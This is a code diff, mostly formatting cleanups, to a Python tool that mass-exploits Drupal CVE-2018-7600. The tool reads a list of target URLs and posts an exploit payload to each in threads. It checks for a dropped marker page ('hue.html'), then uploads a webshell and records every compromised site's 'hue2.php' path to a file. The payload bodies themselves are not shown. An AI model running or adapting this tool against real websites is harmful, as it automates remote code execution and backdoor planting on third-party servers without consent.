@@ -12,6 +12,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 lock = threading.Lock()
 
+
 class Drupal_CVE_2018_7600():
 
     def __init__(self, filename):
@@ -38,12 +39,12 @@ class Drupal_CVE_2018_7600():
                 urlp = urlparse(url)
                 urlp = urlp.scheme + '://' + urlp.netloc
                 url_lists.append(urlp)
-            except:
+            except Exception as e:
                 pass
         url_lists = set(url_lists)
         url_lists = list(url_lists)
         return url_lists
-    
+
     def check_vuln(self, q):
         while True:
             #with lock:
@@ -57,16 +58,19 @@ class Drupal_CVE_2018_7600():
                 with open('drupalrce_sites.txt', 'a+') as f:
                     try:
                         url2 = url + pathvn
-                        req = post(url2, headers=headers, verify=False, timeout=25, data=payload)
+                        req = post(url2, headers=headers, verify=False,
+                                   timeout=25, data=payload)
                         if req.status_code == 200:
                             print('[+] Possible exploitable.. Confirming..')
                             url3 = url + '/hue.html'
-                            nreq = get(url3, headers=headers, verify=False, timeout=25)
+                            nreq = get(url3, headers=headers,
+                                       verify=False, timeout=25)
                             if 'anarcoder' in nreq.content.decode("utf-8"):
                                 print('[+] \033[31mVulnerable!!\033[33m Page uploaded --> {0}\033[39m'.format(url3))
                                 print('[+] Uploading webshell...')
-                                req = post(url2, headers=headers, verify=False, timeout=25, data=webshell)
-                                f.write(url+'/hue2.php'+'\n')
+                                req = post(url2, headers=headers, verify=False,
+                                           timeout=25, data=webshell)
+                                f.write(url + '/hue2.php' + '\n')
                             q.task_done()
                     except Exception as e:
                         print('[-] Exception - Not vulnerable\n')
